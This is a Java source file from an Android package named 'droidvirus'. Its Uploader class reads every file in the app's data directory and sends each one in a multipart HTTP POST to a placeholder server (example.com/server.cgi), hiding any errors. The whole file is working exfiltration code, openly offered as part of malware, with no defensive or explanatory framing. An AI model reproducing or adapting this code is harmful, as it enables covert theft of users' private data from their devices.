package com.artisanter.droidvirus;

import android.content.Context;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

class Uploader {
    static void uploadAll(Context context){
        String dir = context.getApplicationInfo().dataDir;
        for(File file: new File(dir).listFiles()) {
            postFile(file.getName(), file);
        }
    }
    private static void postFile(final String fileName, final File file) {
        String crlf = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        try {
            HttpURLConnection httpUrlConnection;
            URL url = new URL("http://example.com/server.cgi");
            httpUrlConnection = (HttpURLConnection) url.openConnection();
            httpUrlConnection.setUseCaches(false);
            httpUrlConnection.setDoOutput(true);

            httpUrlConnection.setRequestMethod("POST");
            httpUrlConnection.setRequestProperty("Connection", "Keep-Alive");
            httpUrlConnection.setRequestProperty("Cache-Control", "no-cache");
            httpUrlConnection.setRequestProperty(
                    "Content-Type", "multipart/form-data;boundary=" + boundary);
            DataOutputStream request = new DataOutputStream(
                    httpUrlConnection.getOutputStream());

            request.writeBytes(twoHyphens + boundary + crlf);
            request.writeBytes("Content-Disposition: form-data; name=\"" +
                    fileName + "\";filename=\"" +
                    fileName + "\"" + crlf);
            request.writeBytes(crlf);

            byte[] bytes = toByteArray(file);
            request.write(bytes);
            request.writeBytes(crlf);
            request.writeBytes(twoHyphens + boundary + twoHyphens + crlf);
            request.flush();
            request.close();
        } catch (Exception ignored) {
        }

    }

    private static byte[] toByteArray(File file){
        FileInputStream fis;
        byte[] bArray = new byte[(int) file.length()];
        try{
            fis = new FileInputStream(file);
            fis.read(bArray);
            fis.close();

        }catch(IOException ioExp){
            ioExp.printStackTrace();
        }
        return bArray;
    }
}

